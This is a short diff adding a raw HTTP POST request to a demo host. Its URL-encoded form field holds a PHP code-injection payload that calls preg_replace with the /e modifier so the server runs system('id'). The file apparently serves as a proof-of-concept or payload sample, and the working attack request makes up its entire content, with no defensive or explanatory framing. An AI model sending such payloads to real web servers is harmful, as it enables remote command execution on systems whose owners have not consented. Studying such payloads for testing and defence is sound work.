@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 80
+Connection: close
+
+id=preg_replace%28%22%2Ftest%2Fe%22%2C%22system%28%27id%27%29%22%2C%22test%22%29
